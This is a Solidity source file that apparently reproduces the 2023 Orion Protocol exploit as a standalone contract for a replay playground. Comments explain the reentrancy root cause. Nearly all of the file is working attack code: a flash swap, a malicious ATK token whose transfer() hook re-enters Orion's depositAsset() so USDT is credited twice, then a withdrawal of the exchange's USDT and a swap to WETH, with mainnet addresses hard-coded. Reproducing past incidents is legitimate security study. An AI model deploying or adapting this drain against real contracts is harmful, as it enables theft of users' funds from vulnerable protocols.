// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

// Synthetic standalone exploit for the EVM Playground (2023-02-Orion).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (ContractTest is Test, testExploit() runs the whole sequence and the
// uniswapV2Call flash-swap callback lives on the test itself), so there is no
// standalone exploit contract to deploy. This contract is a faithful,
// self-contained copy of that inline attack (testExploit -> run(), plus
// uniswapV2Call, addLiquidity, deposit, USDTToWETH, and the malicious ATKToken)
// so the playground can deploy it and record run(). Logic and constants are
// copied verbatim from test/Orion_exp.sol.
//
// Root cause: Orion's Exchange credits a user's internal virtual balance
// ledger from the *delta* in its own token balance around depositAsset() and
// swapThroughOrionPool(). OrionPool's swap() optimistically transfers the
// output token to the trader BEFORE its constant-product K check completes.
// When the output token is attacker-controlled (ATKToken), its transfer()
// hook re-enters Orion's depositAsset() mid-swap, while Orion's real USDT
// balance is already inflated by the attacker's flash-borrowed USDT sitting
// in the attacker's own wallet. depositAsset() pulls that USDT in via
// transferFrom and credits the ledger for it a SECOND time -- once via the
// in-flight swap's own credit, and once via the nested deposit. The attacker
// then withdraws far more USDT than was ever really deposited.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface OrionPoolV2Factory {
    function createPair(address tokenA, address tokenB) external;
    function getPair(address tokenA, address tokenB) external view returns (address);
}

interface Uni_Pair_V2 {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function mint(address to) external returns (uint256 liquidity);
}

interface Uni_Router_V3 {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
}

interface ORION {
    function swapThroughOrionPool(
        uint112 amount_spend,
        uint112 amount_receive,
        address[] calldata path,
        bool is_exact_spend
    ) external;
    function depositAsset(address assetAddress, uint112 amount) external;
    function withdraw(address assetAddress, uint112 amount) external;
}

contract OrionDrain {
    IERC20 constant USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    ORION constant ORION_EXCHANGE = ORION(0xb5599f568D3f3e6113B286d010d2BCa40A7745AA);
    OrionPoolV2Factory constant FACTORY = OrionPoolV2Factory(0x5FA0060FcfEa35B31F7A5f6025F0fF399b98Edf1);
    Uni_Router_V3 constant ROUTER_V3 = Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    Uni_Pair_V2 constant FLASH_PAIR = Uni_Pair_V2(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);

    uint256 flashAmount;
    IERC20 ATK;

    // step 0: mint a malicious ERC20 (ATK), seed two OrionPool pairs (ATK/USDT,
    // ATK/USDC), deposit a little real USDC into Orion, then flash-borrow the
    // entire USDT sitting in Orion from the WETH/USDT Uniswap-V2 pair.
    // NOTE: USDT (real Tether) is a non-standard ERC20 -- its transfer()/approve()
    // do not return a bool (some versions return nothing at all), so calling them
    // through a standard IERC20 interface reverts on ABI-decoding the return data.
    // The original test sidesteps this with raw `.call(abi.encodeWithSignature(...))`
    // for every USDT-mutating call; this synthetic copy does the same.
    function run() external {
        ATK = new ATKToken(address(this));
        addLiquidity();

        address(USDT).call(abi.encodeWithSignature("approve(address,uint256)", address(ORION_EXCHANGE), type(uint256).max));
        USDC.approve(address(ORION_EXCHANGE), type(uint256).max);
        ORION_EXCHANGE.depositAsset(address(USDC), 500_000);

        flashAmount = USDT.balanceOf(address(ORION_EXCHANGE));
        FLASH_PAIR.swap(0, flashAmount, address(this), new bytes(1));
        USDTToWETH();
    }

    // step 1: flash-swap callback. Routes a tiny USDC->ATK->USDT swap through
    // Orion. The ATK leg's optimistic out-transfer re-enters via ATKToken's
    // transfer() hook (see below), double-crediting Orion's USDT ledger.
    function uniswapV2Call(address, uint256, uint256, bytes calldata) external {
        address[] memory path = new address[](3);
        path[0] = address(USDC);
        path[1] = address(ATK);
        path[2] = address(USDT);
        ORION_EXCHANGE.swapThroughOrionPool(10_000, 0, path, true);
        ORION_EXCHANGE.withdraw(address(USDT), uint112(USDT.balanceOf(address(ORION_EXCHANGE)) - 1));
        address(USDT).call(
            abi.encodeWithSignature("transfer(address,uint256)", address(FLASH_PAIR), flashAmount * 1000 / 997 + 1000)
        );
    }

    function addLiquidity() internal {
        FACTORY.createPair(address(ATK), address(USDT));
        address pair1 = FACTORY.getPair(address(ATK), address(USDT));
        FACTORY.createPair(address(ATK), address(USDC));
        address pair2 = FACTORY.getPair(address(ATK), address(USDC));
        address(USDT).call(abi.encodeWithSignature("transfer(address,uint256)", pair1, 5 * 1e5));
        ATK.transfer(pair1, 50 * 1e18);
        USDC.transfer(pair2, 5 * 1e5);
        ATK.transfer(pair2, 50 * 1e18);
        Uni_Pair_V2(pair1).mint(address(this));
        Uni_Pair_V2(pair2).mint(address(this));
    }

    // called back by ATKToken.transfer() once this contract's real USDT
    // balance exceeds 1e6 -- i.e. once the flash-borrowed USDT has landed here.
    function deposit() external {
        ORION_EXCHANGE.depositAsset(address(USDT), uint112(USDT.balanceOf(address(this))));
    }

    function USDTToWETH() internal {
        address(USDT).call(abi.encodeWithSignature("approve(address,uint256)", address(ROUTER_V3), type(uint256).max));
        Uni_Router_V3.ExactInputSingleParams memory params = Uni_Router_V3.ExactInputSingleParams({
            tokenIn: address(USDT),
            tokenOut: address(WETH),
            fee: 3000,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: USDT.balanceOf(address(this)),
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        ROUTER_V3.exactInputSingle(params);
    }
}

// The malicious deposit token. Its transfer() hook is the actual root cause:
// once the exploit contract's REAL USDT balance exceeds 1e6 (i.e. once the
// flash-borrowed USDT has arrived), every ATK transfer re-enters the exploit's
// deposit(), which calls Orion.depositAsset(USDT, ...) WHILE Orion's own
// swapThroughOrionPool() call is still mid-flight -- letting the same USDT be
// credited to the attacker's Orion ledger twice.
contract ATKToken is IERC20 {
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "ATKToken";
    string public symbol = "ATK";
    uint8 public decimals = 18;
    address public exp;
    IERC20 constant USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(address exploiter) {
        mint(100 * 1e18);
        exp = exploiter;
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[recipient] += amount;
        if (USDT.balanceOf(exp) > 1e6) {
            exp.call(abi.encodeWithSignature("deposit()"));
        }
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        allowance[sender][msg.sender] -= amount;
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function mint(uint256 amount) public {
        balanceOf[msg.sender] += amount;
        totalSupply += amount;
        emit Transfer(address(0), msg.sender, amount);
    }

    function balanceOfView() external view returns (uint256) {
        return balanceOf[msg.sender];
    }
}
